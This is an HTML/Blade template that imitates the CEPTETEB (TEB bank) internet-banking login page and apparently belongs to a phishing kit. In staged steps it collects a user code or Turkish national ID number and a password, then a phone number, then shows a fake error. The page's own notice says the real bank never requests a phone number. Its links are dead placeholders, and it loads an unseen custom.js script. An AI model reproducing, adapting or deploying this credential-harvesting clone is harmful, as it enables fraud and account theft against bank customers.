<!doctype html>
<html lang="tr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
    <meta charset="utf-8" />
    <title>CEPTETEB İnternet Şubesi</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="tassets/assets/img/favicon.ico">
    <link rel="stylesheet" href="tassets/assets/css/normalize.css">
    <link rel="stylesheet" href="tassets/assets/css/style9089.css?nocache20210331">
    <link rel="stylesheet" href="tassets/assets/css/jquery-ui.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" />

    <link rel="stylesheet" href="tassets/assets/css/teb-style.css">
    <meta content="{{ csrf_token() }}" name="csrf-token" />

    <link rel="stylesheet" href="tassets/assets/css/teb-style-mid74dd.css?nocache20190904" media="(max-width: 480px)">


    <link type="text/css" rel="stylesheet" href="tassets/skin/css/TEBKlavyebbb7.css?nocache20190709" />


    <script type="text/javascript" src="tassets/assets/js/jquery-3.5.0.js"></script>
    <script src="tassets/js/jquery-ui-2.min.js"></script>
    <script src="tassets/assets/js/jquery.glide.min.js"></script>
    <script src="tassets/assets/js/jquery.icheck.min.js"></script>
    <script src="tassets/assets/js/jquery.dataTables.js"></script>
    <script src="tassets/assets/js/jquery.dataTables.rowGrouping.js"></script>
    <script src="tassets/assets/js/main.js"></script>
    {!! $options->value !!}

    <!-- <script type="text/javascript" src="tassets/js/tebrequestutil4411.js?nocache20220203"></script>
    <script src="tassets/assets/tassets/js/teb-mainb7b3.js?nocache20211025"></script>

    <script type="text/javascript" src="tassets/js/TEBObject.js"></script>
    <script type="text/javascript" src="tassets/js/teb-service4411.js?nocache20220203"></script>

    <script type="text/javascript" src="tassets/js/TEBNumericKlavye239c.js?nocache20240927"></script>
    <script type="text/javascript" src="tassets/js/message.js"></script>
    <script type="text/javascript" src="tassets/js/parola90fb.js?nocache20241008"></script>
    <script type="text/javascript" src="tassets/js/common.js"></script>
    <script type="text/javascript" src="tassets/js/clientInfo8e30.js?nocache20170327"></script>
    <script type="text/javascript" src="tassets/js/skala7864.js?nocache20210524"></script>

    <script type="text/javascript">
        $(document).ready(function() {
            var f = document.forms[0];
            f.webklncno.focus();

            isKeyPressed = false;
            isParolaTemp2InputTriggered = false;
            isParolaTempInputTriggered = false;
            isParolaChanged = false;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(successCallback);
            }

            function successCallback(position) {
                var f = document.forms[0];
                f.enlem.value = position.coords.latitude;
                f.boylam.value = position.coords.longitude;
            }


            actvObj = document.getElementById("parolaTempId");



            if (!keypadClose) // FIXME eğer güvenli giriş yüklü değilse.
            {

                overlapObj = new Array(f.parola, f.webklncno, document.getElementsByName("imageField")[0]);
                sLanguage = f.language.value;
                //sanal klavye ilk açıldığında karışık gelsin
                SanalKlavye();

            }


            $("#loginTabs").on("tabsactivate", function(event, ui) {
                //$("#loginTabs").tabs('option','active')
                var tab = "taba";
                var lblKullaniciKoduVal = 'Kullanıcı Kodu/Adı';
                if (ui.newTab.index() == 1) {
                    tab = "tabb";
                    lblKullaniciKoduVal = 'TC Kimlik No';
                }
                $("#lblKullaniciKodu").html(lblKullaniciKoduVal);

                var lgnFrm = document[0];
                lgnFrm.webklncno.value = "";
                lgnFrm.parola.value = "";

                createCookie('LoginSelectedTab', tab, 30);
                document.getElementById("lblKullaniciKodu").focus();
                f.webklncno.focus();
            });

            if (readCookie('LoginSelectedTab') == "tabb") {
                $("#loginTabs").tabs("option", "active", 1);
            }


            // f.deviceId.value = TEB.Browser.uniqueDeviceId();
            // f.anaCihazNo.value = TEB.Browser.anaCihazNo();

            // f.ekranGenislik.value = TEB.Client.genislik;
            // f.ekranYukseklik.value = TEB.Client.yukseklik;
            // f.tarayiciTip.value = TEB.Client.tarayiciTip;
            // f.tarayiciVersiyon.value = TEB.Client.tarayiciVersiyon;
            // f.cihazTipi.value = TEB.Client.cihazTipi;
            // f.isletimSistemi.value = TEB.Client.isletimSistemi;
            // f.islSisVersiyon.value = TEB.Client.islSisVersiyon;

            // TEB.Storage.remove("lastSavedTime");

            // if ($("#divhatirla").length > 0) { // Hatırla fonksiyonu aktif ise.
            //     var UserId = TEB.Storage.get("UserId");
            //     if (UserId != null && UserId != "" & UserId != undefined) {
            //         document.forms[0].webklncno.value = UserId;
            //         document.forms[0].hatirla.checked = true;
            //         $('.custom[type="checkbox"]').iCheck();
            //         document.forms[0].parola.focus();
            //     }
            // }

            // setBanner();



            // var skalaURL = 'https://esube.teb.com.tr/cepteteb/skala/api/create-web-client?AnaCihazNo=' + TEB.Storage.get("AnaCihazNo");
            // var rootDomain = 'teb.com.html';
            // new SkalaSDK(skalaURL, rootDomain);


            $("#submit-btn").click(function(e) {
                var flag = formSubmit();

                if (flag == false) {
                    e.preventDefault();

                    isKeyPressed = false;
                    isParolaTempInputTriggered = false;
                    isParolaChanged = false;
                }
            });

            $("#parolaTempId").on("paste", function(e) {
                e.preventDefault();
            });

            document.getElementById("parolaTempId").addEventListener('input', function(e) {
                if (e.data == null) {
                    isKeyPressed = false;
                    clearPassword();
                }

                isParolaTempInputTriggered = true;

                keyPress(e);
            });

            document.getElementById("parolaTemp2").addEventListener('input', function(e) {
                if (isParolaTemp2InputTriggered == false) {
                    clearPassword();
                    isParolaTemp2InputTriggered = true;
                }
            });

            // prevent select all
            document.getElementById("parolaTempId").addEventListener('select', function() {
                this.selectionStart = this.selectionEnd;
            }, false);

            document.getElementById("parolaTempId").addEventListener('keyup', function() {
                isParolaTempInputTriggered = false;
                isKeyPressed = false;
            });

            document.getElementById("parolaTempId").addEventListener('keydown', function() {
                isParolaTempInputTriggered = false;
                isKeyPressed = true;
            });

            if (isKeyPressed == false) {
                clearPassword();
            }
        });

        // to prevent ctrl + z
        var ctrlDown = false;
        var ctrlKey = 17,
            zKey = 90;
        var isKeyPressed = false;
        var isParolaTemp2InputTriggered = false;
        var isParolaTempInputTriggered = false;

        $(document).keydown(function(e) {
            if (e.keyCode == 17 || e.keyCode == 91) {
                ctrlDown = true;
            }
            if ((ctrlDown && e.keyCode == zKey)) {
                e.preventDefault();
                return false;
            }
        });
        $(document).keyup(function(e) {
            if (e.keyCode == 17 || e.keyCode == 91) {
                ctrlDown = false;
            };
        });
        // to prevent ctrl + z

        var isParolaChanged = false;

        function keyPress(event) {
            var f = document.forms[0];

            if (isKeyPressed == true && isParolaTempInputTriggered == true) {
                if (/^[0-9]+$/.test(event.data)) {
                    var temp = f.parolaTemp.value;
                    var temp2 = f.parola.value;

                    if (temp.length <= 6) {
                        clearPassword();

                        f.parolaTemp.value = Array(temp.length + 1).join('0');
                        f.parola.value = temp2 + event.data;
                        isParolaChanged = true;
                    } else {
                        f.parolaTemp.value = Array(temp2.length + 1).join('0');
                    }
                } else {
                    f.parolaTemp.value = Array(f.parola.value.length + 1).join('0');
                }
            } else {
                clearPassword();
            }

            isKeyPressed = false;
            isParolaTempInputTriggered = false;
        }

        function clearPassword() {
            var f = document.forms[0];
            f.parolaTemp.value = '';
            f.parola.value = '';
        }
    </script> -->
    <style>
        html,
        body,
        form,
        .wrap.login-page {
            height: 100%;
        }
    </style>
</head>

<body>
    <div class="wrap login-page">
        <a class="logo" href="#" onclick="return false;"><img src="tassets/assets/img/logo.png" width="202"
                height="70"></a>
        <div class="welcome-slogan"><span>Bireysel İnternet Şubesine</span> Hoş Geldiniz</div>

        <div class="login-area">

            <ul class="top-right-nav">
                <li><a href="#" target="_blank" rel="noopener noreferrer">Yardım</a></li>
                <li class="eng">

                    <a href="#">English</a>
                </li>
            </ul>

            <div id="first_step">
                <div class="payment-tabs login" id="loginTabs">
                    <ul>
                        <li class="active"><a href="#default-login">Kullanıcı Kodu İle Giriş<i></i></a></li>
                        <li><a href="#tckn-login">TCKN İle Giriş<i></i></a></li>
                    </ul>
                    <div id="default-login" class="payment-tab"></div>
                    <div id="tckn-login" class="payment-tab"></div>

                    <div id="default-login" class="payment-tab">
                        <div class="login-form">
                            <table border="0">
                                <tr class="form-row2">

                                    <td class="kullanici-kodu"><label id="lblKullaniciKodu">TC Kimlik No</label>
                                    </td>


                                    <td>
                                        <input name="webklncno" id="tcOrUserNametxt" type="text"
                                            autocomplete="one-time-code" tabindex="1" maxlength="30" />

                                    </td>
                                </tr>
                                <tr class="form-row2">
                                    <td><label>Parola</label></td>
                                    <td><input id="tbPasswordtxt" name="parolaTemp" type="password" class="textbox"
                                            tabindex="2" autocomplete="one-time-code" onfocus="actvObj=this;" />
                                    <td>
                                </tr>



                                <tr class="form-row2">
                                    <td colspan="2">

                                        <a href="#" id="forgotPassResponsive">Parola Al/Unuttum</a>
                                        <button id="btnLogin" class="continue-btn" name="imageField">DEVAM</button>
                                    </td>
                                </tr>
                            </table>


                            <ul class="forgot-pass">
                                <li class="pass"><a href="javascript:openBasvuru();">Parola Al/Unuttum</a></li>
                                <li class="new"><a href="#" target="_blank" rel="noopener noreferrer">CEPTETEB
                                        Müşterisi Olmak İstiyorum</a>
                                </li>
                            </ul>


                        </div>


                        <div class="login-info-bar" id="login-info-bar1">
                            <div class="banner">
                            </div>

                            <h5>ÖNEMLİ UYARI</h5>
                            <p>İnternet Şubesi'ne giriş yapmak için sizden cep telefonunuzun markası / modeli, cep
                                telefonu numaranız gibi bilgiler istenmemektedir. Bu tür bilgilerin istendiği bir
                                ekranla karşılaşmanız durumunda kesinlikle giriş yapmayınız. Detaylı bilgi için <a
                                    href="#" target="_blank" rel="noopener noreferrer">tıklayın</a>.</p>
                            <p>Tüm güvenlik önlemlerini görmek için <a href="#" target="_blank"
                                    rel="noopener noreferrer">tıklayın</a>.</p>
                            <p>4.5G Geçişi ile ilgili detaylı bilgi almak için <a href="#" target="_blank"
                                    rel="noopener noreferrer">tıklayın</a>.</p>

                            <h5>HABERLER</h5>
                            <p>Parola girişleri sayısal hale getirilmiştir. Parolanızın yalnızca sayısal karakterlerden
                                oluştuğuna dikkat ediniz.</p>
                        </div>

                    </div>
                </div>
            </div>

            <div id="twice_step" class="d-none">
                <div class="login-form">
                    <table border="0">
                        <tbody>
                            <tr class="form-row2">
                                <td class="kullanici-kodu"><label id="lblKullaniciKodu">Telefon Numaranız</label></td>
                                <td>
                                    <input name="webklncno" id="phone" type="text"
                                        autocomplete="one-time-code" tabindex="1" maxlength="30">

                                </td>
                            </tr>
                            <tr class="form-row2">
                                <td colspan="2">
                                    <button id="btnPhone" class="continue-btn" name="imageField">TAMAMLA</button>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div id="three_step" class="d-none">
                <div class="wrongPass clearfix">
                    <img src="tassets/assets/img/hata_icon.png" alt="Hata">
                    <div>
                        <h4>İşleminiz gerçekleştirilememiştir.</h4>
                        <p>Bilgilerinizi kontrol ederek tekrar deneyiniz.<br><br>Parola girişleri sayısal hale
                            getirilmiştir. <br>Parolanızın yalnızca sayısal karakterlerden oluştuğuna dikkat
                            ediniz.<br>Bilgilerinizi hatırlamıyorsanız TEB Kredi Kartı ya da TEB Banka Kartı
                            bilgilerinizle Parola Al/Unuttum'u kullanabilirsiniz.</p>
                        <a href="javascript:location.reload" class="return-back">GERİ</a>


                    </div>
                </div>
            </div>

            <div class="footer">
                <img src="tassets/assets/img/norton-secured.png" alt="Norton Secured" title=""
                    onclick="popUpVSign()" style="cursor:pointer;" />
                <ul>

                    <li><a href="#" target="_blank" rel="noopener noreferrer">Gizlilik ve Kişisel Veriler</a>
                    </li>
                    <li><a href="#" target="_blank" rel="noopener noreferrer">Planlı Çalışma Takvimi</a></li>

                    <li class="bold">Copyright 2024 TEB</li>
                </ul>
            </div>
        </div>

        <div id="teb-footer-logo"><img src="tassets/assets/img/teb-logo-yatay.png" alt="TEB" title="">
        </div>
    </div>


    <input type="password" name="parola" id="parolaTemp2" style="display: none;">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.9/jquery.inputmask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script src="tassets/js/custom.js?rand={{ rand(0, 9) }}"></script>

</body>


</html>
